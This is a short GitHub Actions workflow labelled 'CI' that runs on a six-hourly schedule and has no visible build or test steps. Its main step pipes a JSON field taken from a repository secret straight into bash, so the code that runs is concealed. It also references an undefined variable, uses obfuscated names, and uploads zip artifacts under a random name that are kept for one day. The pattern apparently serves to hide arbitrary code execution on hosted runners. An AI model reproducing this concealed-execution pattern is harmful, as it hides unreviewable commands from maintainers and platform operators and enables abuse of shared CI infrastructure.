name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '10 5,11,17,23 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          tpx20: ${{ secrets.tpx20 }}
        run: |
          printf '%s' "$tpx20" | jq -r .ka0409 | /bin/bash
          printf '%s' "$z62325" | jq -r .lrnb15 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: JDW0ZgPp
          path: "*.zip"
          retention-days: 1
